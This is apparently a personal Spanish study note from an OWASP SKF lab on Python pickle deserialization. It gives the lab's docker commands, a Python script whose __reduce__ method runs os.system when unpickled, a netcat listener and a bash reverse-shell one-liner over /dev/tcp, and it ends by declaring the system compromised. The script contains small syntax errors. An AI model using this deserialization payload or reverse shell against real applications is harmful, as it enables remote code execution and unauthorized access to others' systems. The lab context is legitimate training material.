Pickling proceso mediante los objetos de python se conviernen en cadena de bytes

docker pull blabla1337/owasp-skf-lab:des-pickle
docker run -dit -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:des-pickle

nvim exploitation.py

		import pickle
		import os
		import binascii

		class Exploit(object):
			def __reduce__(self):
				return (os.system. ('id',))
		if __name__ == '__main__':
			print(binascii.hexlify(pickle.dumps(Exploit()))

Ahoya al ejecutarlo nos da la cadena que podemos meter en el campo para ver si se muestra
En caso de que no se muestre podemos ponernos en escucha con 
		nc -nlvp 443

			cambiamos 'id' por 'bash -c "bash -i >& /dev/tcp/0.0.0.0/443 0>&1"'


y PWNED HEMOS ENTRADO AL SISTEMA Y YA PODEMOS HACER UN TRATAMIENTO DE TTI


